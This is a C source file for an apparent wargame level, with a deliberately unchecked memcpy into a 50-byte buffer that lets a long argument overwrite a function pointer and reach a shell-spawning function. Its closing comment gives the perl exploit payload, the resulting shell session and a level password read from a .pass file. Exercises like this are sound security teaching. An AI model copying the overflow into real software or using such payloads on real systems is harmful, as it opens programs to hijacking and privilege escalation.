
#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4); 

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0; 
}

/*
 * The good function  address is 0x08048474
 * 利用缓冲区溢出覆盖函数指针变量的值，从而提权
 *
 * $ ./level03 $(perl -e 'print "A"x(76)."BBBB"')
 * ip at 0x42424242
 * Segment fault
 * $./level03 $(perl -e 'print "A"x(76)."\x74\x84\x04\x08"')
 * Win!
 * sh-4.2$ cd /home/level4
   sh-4.2$ more .pass
   9C4Jxjc3O3IjB7nXej
   sh-4.2$ 
 * */
